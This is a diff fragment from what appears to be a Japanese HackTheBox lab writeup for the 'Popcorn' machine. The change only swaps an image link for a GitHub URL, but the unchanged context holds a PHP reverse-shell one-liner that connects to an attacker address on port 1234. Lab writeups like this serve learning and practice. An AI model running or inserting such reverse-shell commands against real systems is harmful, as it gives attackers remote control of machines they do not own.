@@ -77,7 +77,7 @@ ncでリバースシェルをリッスンしてアクセスする
 php -r '$sock=fsockopen("10.10.14.43",1234);exec("sh <&3 >&3 2>&3");'
 
 ```
-![[Pasted image 20241221042016.png]]
+![](https://raw.githubusercontent.com/crum7/Obsidian/main/HackTheBox_Writeups/Retired/Medium/Popcorn/images/Pasted%20image%2020241221042016.png)
 
 
 ---
